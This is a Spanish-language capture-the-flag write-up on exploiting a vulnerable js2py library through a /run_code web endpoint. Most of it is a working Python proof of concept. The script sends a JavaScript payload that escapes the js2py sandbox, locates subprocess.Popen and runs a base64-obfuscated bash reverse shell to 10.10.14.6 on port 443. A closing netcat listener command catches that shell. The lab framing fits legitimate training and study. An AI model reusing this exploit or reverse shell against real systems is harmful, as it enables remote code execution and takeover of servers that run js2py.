# Explotación de js2py vulnerable (RCE)

## Descripción

[js2py](https://github.com/PiotrDabkowski/Js2Py) es una librería de Python que permite ejecutar código JavaScript desde Python.
En versiones vulnerables, es posible abusar de la forma en que se manejan los objetos internos para escapar del sandbox y acceder a clases de Python, llegando a **ejecución remota de comandos (RCE)**.

En un escenario típico de CTF, una aplicación web expone un endpoint donde el usuario puede enviar código JavaScript para ser evaluado mediante js2py.
Si la versión es vulnerable (ej: filtrada en cabeceras, banners o errores), podemos buscar PoCs públicas asociadas a un CVE y adaptarlas para ganar ejecución de comandos.

---

## Escenario

Aplicación vulnerable con endpoint:

```
POST /run_code
{
    "code": "<codigo JS>"
}
```

La respuesta devuelve el resultado de la ejecución en el servidor.

---

## Explotación

### 1. Reverse shell con js2py

Partiendo de un PoC público para el CVE correspondiente, se adaptó un payload JavaScript capaz de:

* Escapar del sandbox de js2py.
* Localizar la clase `subprocess.Popen`.
* Ejecutar comandos arbitrarios en el host.

### 2. Script PoC en Python

```python
#!/usr/bin/env python3
import requests
import json

# -----------------------------
# Configuración
# -----------------------------
TARGET_HOST = "10.10.11.82"
TARGET_PORT = 8000
ENDPOINT = "/run_code"
URL = f"http://{TARGET_HOST}:{TARGET_PORT}{ENDPOINT}"

# Reverse shell en base64
CMD = "printf L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjYvNDQzIDA+JjEK |base64 -d|bash"

# -----------------------------
# Payload JavaScript adaptado
# -----------------------------
payload = f"""
let hacked, bymarve, n11;
let getattr, obj;

hacked = Object.getOwnPropertyNames({{}});
bymarve = hacked.__getattribute__;
n11 = bymarve("__getattribute__");
obj = n11("__class__").__base__;

function findpopen(o) {{
    let result;
    for (let i in o.__subclasses__()) {{
        let item = o.__subclasses__()[i];
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {{
            return item;
        }}
        if(item.__name__ != "type" && (result = findpopen(item))) {{
            return result;
        }}
    }}
}}

n11 = findpopen(obj)("{CMD}", -1, null, -1, -1, -1, null, null, true).communicate();
console.log(n11);
"""

# -----------------------------
# Preparar datos JSON
# -----------------------------
json_data = json.dumps({"code": payload})
headers = {"Content-Type": "application/json"}

# -----------------------------
# Enviar la petición
# -----------------------------
try:
    response = requests.post(URL, headers=headers, data=json_data, timeout=5)
    print("[+] Payload enviado correctamente.")
    print("----- RESPUESTA DEL SERVIDOR -----")
    print(response.text)
except requests.exceptions.RequestException as e:
    print(f"❌ Error al conectar con el servidor: {e}")
```

---

### 3. Ejecución

Al ejecutar el PoC, se obtiene una **reverse shell** en el atacante:

```bash
nc -lvnp 443
```